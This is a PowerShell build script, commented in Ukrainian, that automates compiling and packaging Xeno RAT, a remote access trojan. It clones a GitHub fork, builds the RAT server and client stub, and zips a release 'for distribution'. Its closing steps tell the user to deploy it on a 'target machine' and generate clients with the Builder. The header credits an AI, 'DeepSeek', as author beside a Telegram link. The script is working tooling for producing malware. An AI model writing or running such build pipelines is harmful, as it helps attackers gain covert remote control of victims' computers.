<#
.SYNOPSIS
    Автоматична збірка Xeno RAT з вихідного коду (гілка vola)

.DESCRIPTION
    Цей скрипт автоматизує процес збірки Xeno RAT на Windows:
    - Перевіряє наявність необхідних інструментів (Git, MSBuild, NuGet)
    - Клонує репозиторій (гілка vola)
    - Відновлює NuGet-пакети
    - Компілює сервер та клієнта
    - Створює релізну папку з готовими файлами
    - Створює архів для розповсюдження

.PARAMETER BuildPath
    Шлях для збірки проєкту. За замовчуванням: C:\XenoRAT-Build

.PARAMETER Branch
    Гілка репозиторію для збірки. За замовчуванням: vola

.EXAMPLE
    .\Build-XenoRAT.ps1
    
.EXAMPLE
    .\Build-XenoRAT.ps1 -BuildPath "D:\MyBuilds" -Branch "main"

.NOTES
    Автор: DeepSeek
t.me/inM9MYYujEms
    Дата: 2025-08-08
    Вимоги: Windows 10/11/Server 2019+, .NET Framework 4.8 SDK
#>

param(
    [string]$BuildPath = "C:\XenoRAT-Build",
    [string]$Branch = "vola"
)

# Кольори для виводу
$Host.UI.RawUI.ForegroundColor = "White"

function Write-ColorOutput {
    param(
        [string]$Message,
        [string]$Color = "White"
    )
    Write-Host $Message -ForegroundColor $Color
}

function Write-Step {
    param([string]$Message)
    Write-ColorOutput "`n===> $Message" "Cyan"
}

function Write-Success {
    param([string]$Message)
    Write-ColorOutput "[✓] $Message" "Green"
}

function Write-Error-Custom {
    param([string]$Message)
    Write-ColorOutput "[✗] $Message" "Red"
}

function Write-Warning-Custom {
    param([string]$Message)
    Write-ColorOutput "[!] $Message" "Yellow"
}

# Заголовок
Clear-Host
Write-ColorOutput @"
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║              Xeno RAT - Автоматична збірка                   ║
║                                                              ║
║  Репозиторій: pitBULLusTO/xeno-rat                           ║
║  Гілка: $Branch                                              ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
"@ "Cyan"

# Крок 1: Перевірка прав адміністратора
Write-Step "Перевірка прав адміністратора"
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Warning-Custom "Скрипт запущено без прав адміністратора. Деякі операції можуть не виконатися."
    Write-Host "Рекомендується запустити PowerShell від імені адміністратора." -ForegroundColor Yellow
    $continue = Read-Host "Продовжити? (y/n)"
    if ($continue -ne 'y') {
        exit 1
    }
} else {
    Write-Success "Скрипт запущено з правами адміністратора"
}

# Крок 2: Перевірка наявності Git
Write-Step "Перевірка наявності Git"
try {
    $gitVersion = git --version 2>&1
    Write-Success "Git встановлено: $gitVersion"
} catch {
    Write-Error-Custom "Git не встановлено!"
    Write-Host "Завантажте та встановіть Git: https://git-scm.com/download/win" -ForegroundColor Yellow
    exit 1
}

# Крок 3: Пошук MSBuild
Write-Step "Пошук MSBuild"
$msbuildPaths = @(
    "C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe",
    "C:\Program Files\Microsoft Visual Studio\2022\Professional\MSBuild\Current\Bin\MSBuild.exe",
    "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\MSBuild\Current\Bin\MSBuild.exe",
    "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\MSBuild\Current\Bin\MSBuild.exe",
    "C:\Program Files (x86)\Microsoft Visual Studio\2019\Professional\MSBuild\Current\Bin\MSBuild.exe",
    "C:\Program Files (x86)\Microsoft Visual Studio\2019\Enterprise\MSBuild\Current\Bin\MSBuild.exe",
    "C:\Program Files (x86)\Microsoft Visual Studio\2017\BuildTools\MSBuild\15.0\Bin\MSBuild.exe"
)

$msbuildPath = $null
foreach ($path in $msbuildPaths) {
    if (Test-Path $path) {
        $msbuildPath = $path
        break
    }
}

if ($null -eq $msbuildPath) {
    Write-Error-Custom "MSBuild не знайдено!"
    Write-Host @"
Встановіть один з наступних компонентів:
1. Visual Studio 2019/2022 (Community/Professional/Enterprise)
2. Build Tools for Visual Studio: https://visualstudio.microsoft.com/downloads/#build-tools-for-visual-studio-2022
   При встановленні оберіть: .NET desktop build tools
"@ -ForegroundColor Yellow
    exit 1
}

Write-Success "MSBuild знайдено: $msbuildPath"

# Крок 4: Перевірка NuGet
Write-Step "Перевірка наявності NuGet"
$nugetPath = "C:\nuget\nuget.exe"
if (-not (Test-Path $nugetPath)) {
    Write-Warning-Custom "NuGet не знайдено, завантажуємо..."
    $nugetDir = "C:\nuget"
    if (-not (Test-Path $nugetDir)) {
        New-Item -ItemType Directory -Path $nugetDir -Force | Out-Null
    }
    try {
        Invoke-WebRequest -Uri "https://dist.nuget.org/win-x86-commandline/latest/nuget.exe" -OutFile $nugetPath
        Write-Success "NuGet завантажено: $nugetPath"
    } catch {
        Write-Error-Custom "Не вдалося завантажити NuGet: $_"
        exit 1
    }
} else {
    Write-Success "NuGet знайдено: $nugetPath"
}

# Крок 5: Створення робочої директорії
Write-Step "Створення робочої директорії"
if (Test-Path $BuildPath) {
    Write-Warning-Custom "Директорія $BuildPath вже існує"
    $cleanup = Read-Host "Видалити та створити заново? (y/n)"
    if ($cleanup -eq 'y') {
        Remove-Item -Path $BuildPath -Recurse -Force
        Write-Success "Стару директорію видалено"
    }
}

if (-not (Test-Path $BuildPath)) {
    New-Item -ItemType Directory -Path $BuildPath -Force | Out-Null
    Write-Success "Створено директорію: $BuildPath"
}

# Крок 6: Клонування репозиторію
Write-Step "Клонування репозиторію (гілка: $Branch)"
$repoPath = Join-Path $BuildPath "xeno-rat"
if (Test-Path $repoPath) {
    Write-Warning-Custom "Репозиторій вже клоновано, пропускаємо..."
} else {
    try {
        Set-Location $BuildPath
        git clone --branch $Branch --single-branch https://github.com/pitBULLusTO/xeno-rat.git
        Write-Success "Репозиторій клоновано"
    } catch {
        Write-Error-Custom "Помилка клонування: $_"
        exit 1
    }
}

Set-Location $repoPath

# Крок 7: Пошук .sln файлів
Write-Step "Пошук файлів рішення (.sln)"
$slnFiles = Get-ChildItem -Path $repoPath -Filter "*.sln" -Recurse
if ($slnFiles.Count -eq 0) {
    Write-Error-Custom "Файли .sln не знайдено!"
    exit 1
}

Write-Success "Знайдено файлів .sln: $($slnFiles.Count)"
foreach ($sln in $slnFiles) {
    Write-Host "  - $($sln.FullName)" -ForegroundColor Gray
}

# Крок 8: Відновлення NuGet-пакетів
Write-Step "Відновлення NuGet-пакетів"
foreach ($sln in $slnFiles) {
    Write-Host "Відновлення пакетів для: $($sln.Name)" -ForegroundColor Gray
    try {
        & $nugetPath restore $sln.FullName
        Write-Success "Пакети відновлено для $($sln.Name)"
    } catch {
        Write-Warning-Custom "Помилка відновлення пакетів для $($sln.Name): $_"
    }
}

# Крок 9: Компіляція проєктів
Write-Step "Компіляція проєктів"
$buildConfig = "Release"
$buildPlatform = "Any CPU"

foreach ($sln in $slnFiles) {
    Write-Host "Компіляція: $($sln.Name)" -ForegroundColor Gray
    try {
        & $msbuildPath $sln.FullName /p:Configuration=$buildConfig /p:Platform="$buildPlatform" /t:Rebuild /m /v:minimal
        if ($LASTEXITCODE -eq 0) {
            Write-Success "Компіляція успішна: $($sln.Name)"
        } else {
            Write-Error-Custom "Помилка компіляції: $($sln.Name) (код: $LASTEXITCODE)"
        }
    } catch {
        Write-Error-Custom "Виняток при компіляції $($sln.Name): $_"
    }
}

# Крок 10: Збірка релізу
Write-Step "Збірка релізної папки"
$releasePath = Join-Path $BuildPath "XenoRAT-Release"
if (Test-Path $releasePath) {
    Remove-Item -Path $releasePath -Recurse -Force
}
New-Item -ItemType Directory -Path $releasePath -Force | Out-Null

# Пошук скомпільованих файлів
$serverExe = Get-ChildItem -Path $repoPath -Filter "xeno rat server.exe" -Recurse | Where-Object { $_.Directory.Name -eq $buildConfig } | Select-Object -First 1
$clientExe = Get-ChildItem -Path $repoPath -Filter "xeno rat client.exe" -Recurse | Where-Object { $_.Directory.Name -eq $buildConfig } | Select-Object -First 1

if ($null -eq $serverExe) {
    Write-Error-Custom "Не знайдено xeno rat server.exe в Release!"
} else {
    Copy-Item -Path $serverExe.FullName -Destination $releasePath
    Write-Success "Скопійовано: xeno rat server.exe"
    
    # Копіюємо всі DLL з директорії сервера
    $serverDir = $serverExe.Directory.FullName
    Get-ChildItem -Path $serverDir -Filter "*.dll" | ForEach-Object {
        Copy-Item -Path $_.FullName -Destination $releasePath
    }
    Write-Success "Скопійовано залежності сервера"
}

if ($null -eq $clientExe) {
    Write-Warning-Custom "Не знайдено xeno rat client.exe в Release (це нормально, клієнт збирається через Builder)"
} else {
    # Створюємо папку stub для Builder
    $stubPath = Join-Path $releasePath "stub"
    New-Item -ItemType Directory -Path $stubPath -Force | Out-Null
    Copy-Item -Path $clientExe.FullName -Destination $stubPath
    Write-Success "Скопійовано: stub/xeno rat client.exe"
}

# Копіюємо плагіни
$pluginsSource = Join-Path $repoPath "Plugins"
if (Test-Path $pluginsSource) {
    $pluginsRelease = Join-Path $releasePath "Plugins"
    Copy-Item -Path $pluginsSource -Destination $pluginsRelease -Recurse -Force
    Write-Success "Скопійовано плагіни"
}

# Крок 11: Створення архіву
Write-Step "Створення архіву"
$archivePath = Join-Path $BuildPath "XenoRAT-Release-$Branch.zip"
if (Test-Path $archivePath) {
    Remove-Item -Path $archivePath -Force
}

try {
    Compress-Archive -Path "$releasePath\*" -DestinationPath $archivePath -CompressionLevel Optimal
    Write-Success "Архів створено: $archivePath"
} catch {
    Write-Error-Custom "Помилка створення архіву: $_"
}

# Крок 12: Підсумкова інформація
Write-Step "Збірку завершено!"
Write-Host @"

╔══════════════════════════════════════════════════════════════╗
║                     РЕЗУЛЬТАТИ ЗБІРКИ                        ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  Релізна папка: $releasePath
║  Архів: $archivePath
║                                                              ║
║  Вміст релізу:                                               ║
"@ -ForegroundColor Green

Get-ChildItem -Path $releasePath -Recurse -File | ForEach-Object {
    $relativePath = $_.FullName.Replace($releasePath, "").TrimStart('\')
    Write-Host "║    - $relativePath" -ForegroundColor Gray
}

Write-Host @"
║                                                              ║
╠══════════════════════════════════════════════════════════════╣
║                     НАСТУПНІ КРОКИ                           ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  1. Розпакуйте архів на цільовій машині                      ║
║  2. Запустіть "xeno rat server.exe" від імені адміністратора ║
║  3. Використайте Builder для створення клієнта               ║
║  4. Прочитайте документацію в репозиторії                    ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
"@ -ForegroundColor Green

Write-Host "`nНатисніть будь-яку клавішу для виходу..." -ForegroundColor Cyan
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
